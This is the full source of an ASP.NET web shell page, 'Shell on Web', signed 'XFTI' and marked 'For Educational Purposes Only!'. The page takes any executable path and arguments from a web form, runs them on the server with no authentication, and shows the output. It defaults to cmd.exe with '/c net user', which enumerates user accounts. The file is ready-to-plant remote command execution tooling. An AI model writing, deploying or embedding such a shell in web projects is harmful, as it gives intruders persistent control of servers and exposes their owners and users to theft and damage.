<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>
<script runat="server">
   sub execCmd(Src As Object, E As EventArgs)
     dim thisproc As New Process()
     dim thiscmd As New ProcessStartInfo(cmdpath.text)
     thiscmd.UseShellExecute = false
     thiscmd.RedirectStandardOutput = true
     thisproc.StartInfo = thiscmd
     thiscmd.Arguments=command.text
     thisproc.Start()
     dim sr As StreamReader = thisproc.StandardOutput
     dim res As String = sr.Readtoend()
     thisproc.Close()
     res = replace(res,"<","&lt;")
     res = replace(res,">","&gt;")
     output.text = vbcrlf & "<pre>" & res & "</pre>"
   End Sub
</script>
<html>
   <body>
      <form runat="server">
         <p>Shell on Web</p>
         <p>
            <asp:Label id="label1" runat="server">Command Line</asp:Label>
            <asp:TextBox id="cmdpath" runat="server" width="500px">c:\windows\system32\cmd.exe</asp:TextBox>
         <p>
            <asp:Label id="label2" runat="server">Arguments</asp:Label>
            <asp:TextBox id="command" runat="server" width="1000px" text="/c net user">/c net user</asp:TextBox>
         <p>
            <asp:Button id="Button" onclick="execCmd" runat="server" text="Go"></asp:Button>
         <p>
            <asp:Label id="output" runat="server"></asp:Label>
         <p>For Educational Purposes Only!</p>
         <p>-- XFTI --</p>
      </form>
   </body>
</html>